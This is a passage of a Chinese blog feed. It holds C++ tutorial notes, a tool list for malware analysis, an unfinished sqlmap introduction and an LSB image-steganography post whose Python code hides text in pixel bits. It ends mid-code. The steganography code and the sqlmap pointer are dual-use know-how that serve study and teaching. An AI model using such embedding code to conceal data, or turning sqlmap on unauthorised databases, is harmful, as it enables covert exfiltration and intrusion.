std::cin.get();&#125;</code></pre><p>看起来似乎打印了一些随机的浮点数值，这是因为实例化Entity类的时候，只分配了内存，但是还没有对内存进行初始化，这样它就会显示内存原来的值。</p><p>需要做的是可能需要将初始化内存并把它设置为0.</p><h3 id="Init函数"><a href="#Init函数" class="headerlink" title="Init函数"></a>Init函数</h3><pre><code class="cpp">#include &lt;iostream&gt;class Entity&#123;public:    float x, y;    void Init()    &#123;        x = 0.0f;        y = 0.0f;    &#125;    void Print()    &#123;    std::cout &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; std::endl;    &#125;&#125;;int main()&#123;    Entity e;    // e.Init();    std::cout &lt;&lt; e.x &lt;&lt; std::endl;    e.Print();    std::cin.get();&#125;</code></pre><p>虽然Init函数能够帮助我们初始化类的变量，但是每次实例化一个对象都需要显示调用Init函数。构造函数能在每次实例化的时候自动调用，简化了这一过程。</p><h3 id="初始化：构造函数"><a href="#初始化：构造函数" class="headerlink" title="初始化：构造函数"></a>初始化：构造函数</h3><p>java中可以自动化初始化基本数据类型，但是cpp不会。</p><p>如果写构造函数，那么它就是一个空的构造函数。</p><pre><code class="cpp">#include &lt;iostream&gt;class Entity&#123;public:    float x, y;    Entity()    &#123;        x = 0.0f;        y = 0.0f;    &#125;    void Print()    &#123;    std::cout &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; std::endl;    &#125;&#125;;int main()&#123;    Entity e;    // e.Init();    std::cout &lt;&lt; e.x &lt;&lt; std::endl;    e.Print();    std::cin.get();&#125;</code></pre><h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><p>有相同函数名，但是参数不一样的函数版本。</p><pre><code class="cpp">#include &lt;iostream&gt;class Entity&#123;public:    float x, y;    Entity()    &#123;        x = 0.0f;        y = 0.0f;    &#125;    Entity(float x1, float y1)    &#123;        x = x1;        y = y1;    &#125;    void Print()    &#123;    std::cout &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; std::endl;    &#125;&#125;;int main()&#123;    // Entity e;    Entity e(10.0f, 5.0f);    std::cout &lt;&lt; e.x &lt;&lt; std::endl;    e.Print();    std::cin.get();&#125;</code></pre><p>构造函数只会在实例化的时候运行，因此，如果使用静态方法，那么构造函数不会执行。</p><h1 id="P26-析构函数"><a href="#P26-析构函数" class="headerlink" title="P26: 析构函数"></a>P26: 析构函数</h1><p>构造函数是当实例化一个对象时运行，析构函数是当对象销毁时运行。</p><p>析构函数是你卸载变量等东西并清理使用的内存。析构函数同时适用于栈和堆分配的对象。</p><p>当new一个对象，如果调用delete析构函数会被调用。</p><p>如果只是栈上的一个变量，当生命周期结束，析构函数也会被调用。</p><pre><code class="cpp">#include &lt;iostream&gt;class Entity&#123;public:    float x, y;    Entity()    &#123;        std::cout &lt;&lt; &quot;Created Entity!&quot; &lt;&lt; std::endl;        x = 0.0f;        y = 0.0f;    &#125;    ~Entity()    &#123;        std::cout &lt;&lt; &quot;Destroryed Entity!&quot; &lt;&lt; std::endl;    &#125;    void Print()    &#123;    std::cout &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; std::endl;    &#125;&#125;;void Function()&#123;    Entity e;    e.Print();&#125;int main()&#123;    Function();    std::cin.get();&#125;</code></pre><h1 id="P27-继承"><a href="#P27-继承" class="headerlink" title="P27: 继承"></a>P27: 继承</h1><p>面向对象是一个巨大的编程范式，类和继承是它的两个基本特性，也是可以利用的最强大的特性。</p><p>继承允许创建相关联的类的层次结构。换句话说，它允许我们包含公共功能的基类，他允许在基类（父类）的基础之上创建子类。</p><p>如果没有继承的思想，那么代码将会得到相当的重复</p><pre><code class="cpp">#include &lt;iostream&gt;class Entity&#123;public:    float X, Y;    void Move(float xa, float ya)    &#123;        X += xa;        Y += ya;    &#125;&#125;;class Player&#123;public:    const char* Name;    float X, Y;    void Move(float xa, float ya)    &#123;        X += xa;        Y += ya;    &#125;    void PrintName()    &#123;        std::cout &lt;&lt; Name &lt;&lt; std::endl;    &#125;&#125;;int main()&#123;    std::cin.get();&#125;</code></pre><p>如果使用继承，那么将会得到简洁的版本。<br>代码在X86 和X64下有不同的运行结果。</p><pre><code class="cpp">#include &lt;iostream&gt;class Entity&#123;public:    float X, Y;    void Move(float xa, float ya)    &#123;        X += xa;        Y += ya;    &#125;&#125;;class Player : public Entity&#123;public:    const char* Name;    void PrintName()    &#123;        std::cout &lt;&lt; Name &lt;&lt; std::endl;    &#125;&#125;;int main()&#123;    std::cout &lt;&lt; sizeof(Entity) &lt;&lt; std::endl;    std::cout &lt;&lt; sizeof(Player) &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><h1 id="P28：虚函数"><a href="#P28：虚函数" class="headerlink" title="P28：虚函数"></a>P28：虚函数</h1><p>虚函数允许在子类中重写方法，例如一个子类重写父类中的方法。</p><h1 id="P29-接口-纯虚函数"><a href="#P29-接口-纯虚函数" class="headerlink" title="P29: 接口 纯虚函数"></a>P29: 接口 纯虚函数</h1><p>纯虚函数允许在基类中定义一个没有实现的函数，然后强制子类去实现该函数。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;class Entity&#123;public:    virtual std::string GetName() = 0;&#125;;class Player : public Entity&#123;private:    std::string m_Name;public:    Player(const std::string&amp; name)        : m_Name(name)&#123;&#125;    std::string GetName() override &#123; return m_Name;  &#125;&#125;;void PrintName(Entity* entity)&#123;    std::cout &lt;&lt; entity-&gt;GetName() &lt;&lt; std::endl;&#125;int main()&#123;    // Entity* e = newEntity();    Entity* e = new Player(&quot;123&quot;);    PrintName(e);    Player* p = newPlayer(&quot;Cherno&quot;);    PrintName(p);&#125;</code></pre><h1 id="P30-可见性"><a href="#P30-可见性" class="headerlink" title="P30: 可见性"></a>P30: 可见性</h1><p>可见性是一个属于面向对象的编程理念，它指类的某些成员或方法实际上有很多可见性。</p><p>可见性对实际的程序运行方式没有影响。对程序性能或类似的东西也没有影响。它只是语言中存在的东西，帮助你写更好的组织代码。</p><h3 id="private，protected，public"><a href="#private，protected，public" class="headerlink" title="private，protected，public"></a>private，protected，public</h3><p>class默认私有，struct默认公有。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;class Entity&#123;private:    int X, Y;public:    Entity()    &#123;        X = 0;        Y = 0;    &#125;&#125;;class Player : public Entity&#123;public:    Player()    &#123;        X = 2;    &#125;&#125;;int main()&#123;    Entity e;    e.X = 2;    std::cin.get();&#125;</code></pre><h1 id="P31-数组"><a href="#P31-数组" class="headerlink" title="P31: 数组"></a>P31: 数组</h1><p>指针基本上是数组的工作方式。</p><p>数组基本上是元素的集合，按特定顺序排列的一堆东西。它方便批量化处理大量数据。</p><h3 id="数组越界"><a href="#数组越界" class="headerlink" title="数组越界"></a>数组越界</h3><pre><code class="cpp">#include &lt;iostream&gt;int main()&#123;    int example[5];    example[0] = 2;    example[4] = 4;        // Debug模式会报错，但是Release模式就会发生内存违规访问。    example[-1] = 5;    example[5] = 2;    std::cout &lt;&lt; example[0] &lt;&lt; std::endl;    std::cout &lt;&lt; example &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><h3 id="数组赋值"><a href="#数组赋值" class="headerlink" title="数组赋值"></a>数组赋值</h3><pre><code class="cpp">#include &lt;iostream&gt;int main()&#123;    int example[5];    //example[0] = 2;    //example[1] = 2;    //example[2] = 2;    //example[3] = 2;    //example[4] = 4;        for (int i = 0; i &lt; 5; i++)        example[i] = 2;    std::cout &lt;&lt; example[0] &lt;&lt; std::endl;    std::cout &lt;&lt; example &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><h3 id="数组和指针"><a href="#数组和指针" class="headerlink" title="数组和指针"></a>数组和指针</h3><pre><code class="cpp">#include &lt;iostream&gt;int main()&#123;    int example[5];        example[2] = 5;    std::cout &lt;&lt; example[2] &lt;&lt; std::endl;    int* ptr = example;    *(ptr + 2) = 6;    //*((int*)ptr +2) = 6;    //*(int*)((char*)ptr +8) = 6;    std::cout &lt;&lt; example[2] &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><h3 id="栈和堆上创建数组"><a href="#栈和堆上创建数组" class="headerlink" title="栈和堆上创建数组"></a>栈和堆上创建数组</h3><p>如果你在函数中创建一个数组，需要返回它那么需要使用new关键字或者传入数组的地址。</p><p>在堆上创建数组，你可以控制它的生命周期，创建或者销毁。</p><pre><code class="cpp">#include &lt;iostream&gt;class Entity&#123;public:    //int* example = new int[5];    int example[5];    Entity()    &#123;        for (int i = 0; i &lt; 5; i++)            example[i] = 2;    &#125;&#125;;int main()&#123;    Entity e;    std::cin.get();&#125;</code></pre><h3 id="安全数组std-array"><a href="#安全数组std-array" class="headerlink" title="安全数组std::array"></a>安全数组std::array</h3><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;array&gt;class Entity&#123;public:    // 原始数组    //int example[5];    std::array&lt;int, 5&gt; example;    Entity()    &#123;        for (int i = 0; i &lt; example.size(); i++)            example[i] = 2;    &#125;&#125;;int main()&#123;    Entity e;    std::cin.get();&#125;</code></pre><h1 id="P32：字符串"><a href="#P32：字符串" class="headerlink" title="P32：字符串"></a>P32：字符串</h1><p>字符串就是字符数组</p><p>额，烫烫烫是数组守卫，栈守卫。就是那些预分配的位置cc</p><pre><code class="cpp">#include &lt;iostream&gt;int main()&#123;    // 不能更改字符    const char* name = &quot;liang&quot;;    std::cout &lt;&lt; name &lt;&lt; std::endl;    // char name2[5] = &#123; &#39;l&#39;, &#39;i&#39;, &#39;a&#39;, &#39;n&#39;, &#39;g&#39; &#125;;    char name2[6] = &#123; &#39;l&#39;, &#39;i&#39;, &#39;a&#39;, &#39;n&#39;, &#39;g&#39;, &#39;\0&#39;&#125;;    std::cout &lt;&lt; name2 &lt;&lt; std::endl;    std::cin.get(); &#125;</code></pre><h3 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h3><p>string是cpp的类，有一些可使用的方法。</p><p>它接收一个const char*的参数</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123;    //这里接收char*参数，所以不能把指针加在一起    std::string name = &quot;liang&quot;;// + &quot; hello&quot;;    // name是有方法的因此可以使用+    name += &quot; hello&quot;;    std::cout &lt;&lt; name &lt;&lt; std::endl;    std::cin.get(); &#125;</code></pre><p>加一个引用可以避免字符串的复制，因为这很花费时间。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;//承诺不会修改void PrintString(const std::string&amp; string)&#123;    std::cout &lt;&lt; string &lt;&lt; std::endl;&#125;int main()&#123;    //这里接收char*参数，所以不能把指针加在一起    std::string name = &quot;liang&quot;;// + &quot; hello&quot;;    // name是有方法的因此可以使用+    name += &quot; hello&quot;;    std::cout &lt;&lt; name &lt;&lt; std::endl;    std::cin.get(); &#125;</code></pre><h1 id="P33：字符串字面量"><a href="#P33：字符串字面量" class="headerlink" title="P33：字符串字面量"></a>P33：字符串字面量</h1><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123;    //const char* name = u8&quot;L\0ang&quot;;    const char* name = &quot;Lang&quot;;    const wchar_t* name2 = L&quot;Lang&quot;;    const char16_t* name3 = u&quot;Lang&quot;;    const char32_t* name4 = U&quot;Lang&quot;;    std::cout &lt;&lt; strlen(name) &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><h1 id="P34：Const"><a href="#P34：Const" class="headerlink" title="P34：Const"></a>P34：Const</h1><p>const伪关键字，因为他在代码方面做不了什么。</p><p>有点像类的可见性，只是一个机制，让代码更加干净。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123;    const int MAX_AGE = 90;    int a = 5;    //const int a = 5;    a = 2;    std::cin.get();&#125;</code></pre><p>const int*和int const*实际是完全一样的，只是你看见不同的编程风格，重要的是这是一个承诺不会改变指向的指针。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123;    const int MAX_AGE = 90;    const int* a = new int;    //int const* a = new int;    int* a = new int;    *a = 2;    a = (int*)&amp;MAX_AGE;    std::cout &lt;&lt; a &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><p>但是如果int* const和int const*那么将会有很大的区别。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123;    const int MAX_AGE = 90;    // const int* const a = new int;    int* const a = new int;    //int const* a = new int;    *a = 2;    a = (int*)&amp;MAX_AGE;    std::cout &lt;&lt; a &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><p>如果你个方法标记为const，那么它承诺不会修改函数中的变量，因此只能调用const方法。所以优势后Getter会有const和非const的两个版本。</p><p>另外被mutable标记的变量可以被const方法修改。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;class Entity&#123;private:    int m_X, m_Y;    mutable int var;public:    int GetX() const    &#123;        //m_X = 2;        var = 2;        return m_X;    &#125;    void SetX(int x)    &#123;        m_X = x;    &#125;&#125;;void PrintEntity(const Entity&amp; e)&#123;    std::cout &lt;&lt; e.GetX() &lt;&lt; std::endl;&#125;int main()&#123;    Entity e;    std::cin.get();&#125;</code></pre><h1 id="P35：Mutable"><a href="#P35：Mutable" class="headerlink" title="P35：Mutable"></a>P35：Mutable</h1><p>mutable主要有两个应用，和const，lambda</p><p>主要的应用类的const</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;class Entity&#123;private:    std::string m_Name;    mutable int m_DebugCount = 0;public:    const std::string&amp; GetName() const     &#123;        m_DebugCount++;        return m_Name;    &#125;&#125;;int main()&#123;    const Entity e;    e.GetName();    std::cin.get();&#125;</code></pre><p>lambda等于“&#x3D;”的时候是传值，额使用mutable让代码可以干净一点，但实际上lambda中的x不是和外面的x一样的。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;class Entity&#123;private:    std::string m_Name;    mutable int m_DebugCount = 0;public:    const std::string&amp; GetName() const     &#123;        m_DebugCount++;        return m_Name;    &#125;&#125;;int main()&#123;    const Entity e;    e.GetName();    int x = 8;    auto f = [=]() mutable    &#123;        // y = x;        // y++;        x++;        std::cout &lt;&lt; x &lt;&lt; std::endl;    &#125;;    f();    // x = 8;    std::cin.get();&#125;</code></pre><h1 id="P36：初始化列表"><a href="#P36：初始化列表" class="headerlink" title="P36：初始化列表"></a>P36：初始化列表</h1><p>相当于一种语法糖，帮助按照定义变量的顺序在构造函数初始化对象。</p><h1 id="P37：三元操作符"><a href="#P37：三元操作符" class="headerlink" title="P37：三元操作符"></a>P37：三元操作符</h1><p>三元操作符实际上是if语句的语法糖。</p><p>三元运算符可以在定义的时候初始化更快。if也可以做，但是没那么干净，另外三元运算符可以嵌套，但是代码可读性会很差。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;static int s_Level = 1;static int s_Speed = 2;int main()&#123;    if (s_Level &gt; 5)        s_Speed = 10;    else        s_Speed = 5;        s_Speed = s_Level &gt; 5 ? 10 : 5;    std::string rank = s_Level &gt; 10 ? &quot;Master&quot; : &quot;Beginner&quot;;    std::string otherRank;    if (s_Level &gt; 10)        otherRank = &quot;Master&quot;;    else        otherRank = &quot;Beginner&quot;;    std::cin.get();&#125;</code></pre><h1 id="P38：创建并初始化CPP对象"><a href="#P38：创建并初始化CPP对象" class="headerlink" title="P38：创建并初始化CPP对象"></a>P38：创建并初始化CPP对象</h1><p>基本上创建一个类需要对其进行实例化（除非完全是一个静态类）</p><p>即使创建一个空的类，也会至少在内存中占用一个字节。</p><p>内存区域：堆，栈，代码区（一些机器码）</p><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>生命周期结束，就是代码不在需要引用这个对象，那么将会被销毁。在一个函数里面就是调用的函数被返回，函数里面的栈对象就被销毁了。</p><p>堆手动创建，手动销毁。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;// defineusing String = std::string;class Entity&#123;private:    String m_Name;public:    Entity() : m_Name(&quot;Unknown&quot;)&#123;&#125;    Entity(const String&amp; name) : m_Name(name)&#123;&#125;    const String&amp; GetName() const &#123; return m_Name; &#125;&#125;;int main()&#123;    //Entity entity;    Entity entity = Entity(&quot;Lang&quot;);    std::cout &lt;&lt; entity.GetName() &lt;&lt; std::endl;    std::cin.get();&#125;</code></pre><p>可以任何时候这样实例化一个对象，但是如果需要在函数的生命周期以外使用对象，那么这样是不行的。</p><p>就像这样</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;// defineusing String = std::string;class Entity&#123;private:    String m_Name;public:    Entity() : m_Name(&quot;Unknown&quot;)&#123;&#125;    Entity(const String&amp; name) : m_Name(name)&#123;&#125;    const String&amp; GetName() const &#123; return m_Name; &#125;&#125;;void Function()&#123;    int a = 2;    Entity entity = Entity(&quot;Lang&quot;);&#125;int main()&#123;    Entity* e;    &#123;        Entity entity(&quot;Lang&quot;);        e = &amp;entity;        std::cout &lt;&lt; entity.GetName() &lt;&lt; std::endl;    &#125;    std::cin.get();&#125;</code></pre><p>另外如果对象太多或者韩勇非常多的内存，由于栈只有MB级别的大小，因此也会考虑使用堆。</p><p>另外，在堆上创建对象将会更加耗时，并且要手动销毁对象。然后使用new关键字返回的是一个对象指针，你要用“-&gt;”去调用方法，而不是“.”，因为需要指向。</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;string&gt;// defineusing String = std::string;class Entity&#123;private:    String m_Name;public:    Entity() : m_Name(&quot;Unknown&quot;)&#123;&#125;    Entity(const String&amp; name) : m_Name(name)&#123;&#125;    const String&amp; GetName() const &#123; return m_Name; &#125;&#125;;int main()&#123;    Entity* e;    &#123;        Entity* entity = new Entity(&quot;Lang&quot;);        e = entity;        std::cout &lt;&lt; entity-&gt;GetName() &lt;&lt; std::endl;        // delete entity;    &#125;    delete e;    std::cin.get();&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码</title>
      <link href="/posts/software_dll/"/>
      <url>/posts/software_dll/</url>
      
        <content type="html"><![CDATA[<h1 id="恶意代码分析概述"><a href="#恶意代码分析概述" class="headerlink" title="恶意代码分析概述"></a>恶意代码分析概述</h1><h2 id="静态分析方法"><a href="#静态分析方法" class="headerlink" title="静态分析方法"></a>静态分析方法</h2><h3 id="恶意代码指纹：哈希"><a href="#恶意代码指纹：哈希" class="headerlink" title="恶意代码指纹：哈希"></a>恶意代码指纹：哈希</h3><ul><li><a href="https://www.winmd5.com/">WinMD5</a></li></ul><h3 id="反病毒引擎扫描"><a href="#反病毒引擎扫描" class="headerlink" title="反病毒引擎扫描"></a>反病毒引擎扫描</h3><p>目前收集到的在线反病毒引擎：</p><ul><li><a href="https://www.virustotal.com/">VirusTotal</a></li><li><a href="https://www.virscan.org/">VirScan</a></li></ul><h3 id="特征字符串：Strings"><a href="#特征字符串：Strings" class="headerlink" title="特征字符串：Strings"></a>特征字符串：Strings</h3><ul><li><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/strings">Strings</a></li></ul><p>使用命令<code>Strings main.exe &gt; main.txt</code>将可执行文件中的字符重定向到文件main.txt中。</p><h3 id="去壳与反汇编"><a href="#去壳与反汇编" class="headerlink" title="去壳与反汇编"></a>去壳与反汇编</h3><p>压缩和混淆的代码通常至少包括LoadLibrary和GetProcAddress函数，它们用于加载和访问其他函数。</p><p>待学习。。。</p><h2 id="2-动态分析技术"><a href="#2-动态分析技术" class="headerlink" title="2. 动态分析技术"></a>2. 动态分析技术</h2><p>虚拟机&amp;&amp;虚拟机逃逸</p><h3 id="进程查看"><a href="#进程查看" class="headerlink" title="进程查看"></a>进程查看</h3><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/procmon">Process Explore</a></p><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">Process Monitor</a></p><h3 id="注册表相关"><a href="#注册表相关" class="headerlink" title="注册表相关"></a>注册表相关</h3><p><a href="https://sourceforge.net/">sourceforge</a></p><p><a href="https://sourceforge.net/projects/regshot/">regshot</a></p><h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><p>warshark</p>]]></content>
      
      
      <categories>
          
          <category> 恶意代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 恶意代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全：sqlmap使用</title>
      <link href="/posts/security_sql/"/>
      <url>/posts/security_sql/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>介绍：<a href="https://sqlmap.org/">sqlmap</a></p><p>根据官方的说法：sqlmap是一个开源的渗透测试工具，它可以自动化的检测和利用SQL注入漏洞以及接管数据库服务器。</p><h2 id="sqlmap下载-安装"><a href="#sqlmap下载-安装" class="headerlink" title="sqlmap下载&amp;&amp;安装"></a>sqlmap下载&amp;&amp;安装</h2><p>sqlmap是一个python项目，下载即可，没有安装过程。</p><p>下载：<a href="https://sqlmap.org/">sqlmap</a></p><h2 id="sqlmap使用教程"><a href="#sqlmap使用教程" class="headerlink" title="sqlmap使用教程"></a>sqlmap使用教程</h2><p>切换到sqlmap下载目录进行cmd，使用python运行sqlmap.py。</p><p><em>如果想在任意目录使用sqlmap.py，添加环境变量？</em></p><h3 id="–help"><a href="#–help" class="headerlink" title="–help"></a>–help</h3><p>使用<code>python sqlmap.py --help</code>进行测试。</p><p><img src="/image-1.png" alt="Alt text"></p><p>sqlmap支持非常多的选项.</p><ul><li>Target选项：</li><li>Request选项：</li></ul><h3 id="使用sqlmap实现漏洞利用"><a href="#使用sqlmap实现漏洞利用" class="headerlink" title="使用sqlmap实现漏洞利用"></a>使用sqlmap实现漏洞利用</h3><ol><li>首先寻找注入点</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像空域隐写技术：LSB及其改进</title>
      <link href="/posts/steg_lsb/"/>
      <url>/posts/steg_lsb/</url>
      
        <content type="html"><![CDATA[<h3 id="灰度图"><a href="#灰度图" class="headerlink" title="灰度图"></a>灰度图</h3><p>灰度图就是使用黑色，白色和它们之间不同程度的灰色表示的图片。一般来说灰度图的每个像素在计算机中使用8比特表示，也就是8比特位深，有0-255共256个颜色值。</p><p>下面是一张512*512像素8比特位深灰度图：</p><p><img src="/img/steg_lsb/lena.bmp" alt="Alt text"></p><h3 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h3><p>对于8比特表示的灰度图，高位比特对像素颜色的贡献明显高于低位比特。就像十进制111，明显百位的“1”是100，个位的“1”是1，100对111的贡献显然比1要大得多，其他进制包括二进制也是这个道理。</p><p>编写程序取不同比特位构建出新的位平面图就可以看清每个比特位对图片了贡献了。</p><pre><code class="python">import cv2import numpy as npfrom matplotlib import pyplot as plt# 读取灰度图像img = cv2.imread(&#39;lena.bmp&#39;, cv2.IMREAD_GRAYSCALE)# 获取图像的宽度和高度height, width = img.shape# 初始化一个全零矩阵，用于存储每个平面的像素值planes = np.zeros((height, width, 8), dtype=np.uint8)# 将每个像素点的二进制表示拆分为8个位平面for i in range(8):    planes[:, :, i] = cv2.bitwise_and(img, 2 ** i)    planes[:, :, i] = planes[:, :, i] * 255 / 2 ** i# 展示每个位平面for i in range(8):    plt.subplot(2, 4, i+1)    plt.imshow(planes[:, :, i], cmap=&#39;gray&#39;)    plt.axis(&#39;off&#39;)# 显示窗口plt.show()</code></pre><p>第1-8位平面图，可以看到高位对图像贡献高，而低位贡献低：</p><p><img src="/img/steg_lsb/image.png" alt="Alt text"></p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>LSB表示最低位比特。</p><p>经过上面分析，发现最低位对图像的贡献很小，其实也符合直觉。比如一个8比特像素11111111表示255，那么去掉最后一位变成11111110表示254，颜色差别只会相差1。</p><p>那么这种差距人眼是否能够察觉呢？</p><p>编写代码去除最低位平面。</p><pre><code class="python">import cv2import numpy as npfrom matplotlib import pyplot as plt# 读取灰度图像img = cv2.imread(&#39;lena.bmp&#39;, cv2.IMREAD_GRAYSCALE)# 获取图像的宽度和高度height, width = img.shape# 去除最低位平面planes = np.zeros((height, width, 8), dtype=np.uint8)for i in range(8):    planes[:, :, i] = cv2.bitwise_and(img, 2 ** i)# 去除最低位平面removed_plane_img = np.copy(img) # 复制原始图像removed_plane_img &amp;= 0xFE # 将最低位清零# 展示原图和去除最低位平面的图像plt.subplot(1, 2, 1)plt.imshow(img, cmap=&#39;gray&#39;)plt.title(&#39;Original Image&#39;)plt.axis(&#39;off&#39;)plt.subplot(1, 2, 2)plt.imshow(removed_plane_img, cmap=&#39;gray&#39;)plt.title(&#39;Image with Lowest Bit Plane Removed&#39;)plt.axis(&#39;off&#39;)# 显示窗口plt.show()</code></pre><p>这是将最低位平面去除的图像：</p><p><img src="/img/steg_lsb/image-1.png" alt="Alt text"></p><p>既然，最低位平面去除对于视觉几乎没有影响，那么在最低位平面进行信息隐藏就具有可行性。</p><h3 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h3><p>简单来说，首先清空灰度图的最低位平面，即将所有比特置为0。然后将所要隐写的信息填入最低位平面即可。</p><p>有一个问题是我们可能填入不了一整个位平面。因此只需要填入比特时改变原始比特为填入比特即可。</p><p>下面代码给出嵌入图片的代码：</p><pre><code class="python">import cv2import numpy as np# 读取原始图像img = cv2.imread(&#39;lena.bmp&#39;)# 将文本转换为二进制形式text = &quot;Hello, World!\0&quot;binary_text = &#39;&#39;.join(format(ord(char), &#39;08b&#39;) for char in text)# 定义嵌入函数def embed_text(img, text):    # 检查文本长度是否超过图像可容纳的位数    max_len = img.shape[0] * img.shape[1] * 3    if len(text) &gt; max_len:        raise ValueError(&quot;Text is too long to embed into the image.&quot;)    # 将文本逐位嵌入到图像的最低有效位    text_index = 0    for row in img:        for pixel in row:            for i in range(3):                if text_index &lt; len(text):                    # 将文本的每一位嵌入到像素的最低有效位                    pixel[i] = (pixel[i] &amp; 0xFE) | int(text[text_index])                    text_index += 1                else:                    break            if text_index &gt;= len(text):                break        if text_index &gt;= len(text):            break    return img# 嵌入文本到图像中embedded_img = embed_text(np.copy(img), binary_text)# 保存嵌入文本后的图像cv2.imwrite(&#39;lena_embedded.bmp&#39;, embedded_img)# 读取嵌入了文本的图像embedded_img = cv2.imread(&#39;lena_embedded.bmp&#39;)# 定义提取函数def extract_text(img):    binary_text = &#39;&#39;    for row in img:        for pixel in row:            for i in range(3):                # 提取像素的最低有效位                binary_text += str(pixel[i] &amp; 1)    # 将二进制文本转换为字符形式    text = &#39;&#39;    for i in range(0, len(binary_text), 8):        text += chr(int(binary_text[i:i + 8], 2))        if text[-1] == &#39;\0&#39;:            break    return text[:-1]# 提取嵌入的文本extracted_text = extract_text(np.copy(embedded_img))# 打印提取的文本print(extracted_text)</code></pre><h3 id="LSB隐写改进"><a href="#LSB隐写改进" class="headerlink" title="LSB隐写改进"></a>LSB隐写改进</h3><p>LSB隐写有不错的容量，如果考虑使用最低三位进行隐写，那么一张图片可以容纳像素*3的比特的信息。</p><p>但是如果嵌入比特，那么可能会暴露一些统计特性。由于正常图片最低位比特一般由相机噪声决定，0和1是随机生成的，各站50%。</p><p>如果大量嵌入不是50%比例的0和1，那么这个统计特性将会被改变。</p><p>即使嵌入相同比例，还是会有问题，因为清空最低位比特进行嵌入的方式将会使相邻两个值一致，嵌入相同比例比特相邻比特依然一样，在直方图中表示为阶梯分布。</p><p>下面是针对嵌入文本的改进代码，添加了一个种子秘钥生成嵌入位置秘钥，另外改进了LSB嵌入规则为嵌入比特与最低位比特不同时原比特随机加或者减一。</p><pre><code class="python">import randomfrom PIL import Imageimport numpy as npdef text_to_binary(text):    binary_data = &#39;&#39;.join(format(ord(c), &#39;08b&#39;) for c in text)    return binary_datadef binary_to_text(binary):    text = &#39;&#39;.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))    return textimage_path = &#39;input.png&#39;output_image_path = &#39;modified_image.png&#39;data_to_hide = &quot;han1&quot;def png_rgb_lsb(image_path, data_to_hide, output_image_path):    # 读取图片    image = Image.open(image_path)    # 将图片转换为RGB格式    pixels = list(image.getdata())    # 将数据转换为二进制形式    binary_data = text_to_binary(data_to_hide)    if len(binary_data) &gt; len(pixels) * 3:        raise ValueError(&quot;隐藏数据过大，无法完全嵌入到图像中&quot;)    key = [134304, 24906, 1165134, 840434, 1034067, 256626, 960109, 677039, 604987, 1138403, 1252149, 1328829, 693323, 100995, 281079, 808381, 448302, 1262668, 622356, 1360412, 321087, 1424695, 399419, 1260153, 1180374, 1115301, 1420382, 860763, 799633, 764414, 179750, 856208]    # 嵌入rb两个个通道的最低位    # 相同不嵌入，不同随机加一或者减一，如果通道值为0加一，通道值为255减1    index = 0    for k in key:        pixel = list(pixels[k])        if index % 2 == 0:            # pixel[0] = pixel[0] &amp; 254 | int(binary_data[index])            if pixel[0] &amp; 1 != int(binary_data[index]):                if random.randint(0, 1) == 0:                    if pixel[0] &amp; 1 == 0:                        pixel[0] = (pixel[0] &amp; 254) | (pixel[0] + 1)                    else:                        pixel[0] = (pixel[0] &amp; 254) | (pixel[0] - 1)                else:                    if pixel[0] &amp; 255 == 255:                        pixel[0] = (pixel[0] &amp; 254) | (pixel[0] - 1)                    else:                        pixel[0] = (pixel[0] &amp; 254) | (pixel[0] + 1)            index = index + 1        else:            # 